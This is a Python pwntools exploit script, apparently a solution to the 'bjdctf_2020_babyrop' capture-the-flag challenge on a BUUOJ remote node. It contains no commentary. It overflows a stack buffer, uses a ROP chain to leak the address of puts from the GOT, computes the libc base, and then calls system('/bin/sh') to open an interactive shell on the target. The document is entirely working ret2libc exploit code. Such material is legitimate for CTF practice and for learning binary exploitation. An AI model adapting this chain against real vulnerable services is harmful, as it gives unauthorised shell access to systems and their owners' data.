from pwn import *

context.log_level = 'debug'

proc_name = './bjdctf_2020_babyrop'

#p = process(proc_name)
p = remote('node3.buuoj.cn', 28415)
elf = ELF(proc_name)

libc = ELF('libc-2.23.64-buu.so')

vul_addr = elf.symbols['vuln']
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

pop_rdi_ret = 0x400733

p.recvuntil('story!\n')

payload = b'a' * (0x20 + 8) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vul_addr)

p.sendline(payload)

real_puts_addr = u64(p.recvuntil('\n')[:-1].ljust(8, b'\0'))

libc_base = real_puts_addr - libc.symbols['puts']

system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

p.recvuntil('story!\n')

payload = b'a' * (0x20 + 8) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)

p.sendline(payload)

p.interactive()
